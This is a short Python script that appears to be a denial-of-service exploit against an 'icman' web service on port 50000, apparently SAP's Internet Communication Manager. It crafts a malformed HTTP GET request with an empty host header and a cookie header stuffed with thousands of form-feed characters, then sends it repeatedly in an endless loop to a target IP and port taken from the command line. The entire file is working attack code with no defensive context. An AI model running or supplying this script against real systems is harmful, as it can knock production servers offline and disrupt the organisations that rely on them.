#!/usr/bin/env python
import socket
import argparse


data = 'get / HTTP/1.0\r\nhost:\r\ncookie: ;\x0c%s\r\n\r\n' % ("\x0c" * 0x1b58)

def run(args):
    addr = (args.ip, args.port)

    try:
        s = socket.create_connection(addr,timeout=0.3)
        while True:
             s.send(data)
    except socket.error:
       pass




if __name__ == '__main__':
    apars = argparse.ArgumentParser(description='icman - 50000 port - DoS')
    apars.add_argument('--ip', type=str, help='icman ip', required=True)
    apars.add_argument('--port', type=int, help='icman web port', required=True, default=50000)

    args = apars.parse_args()
    run(args)
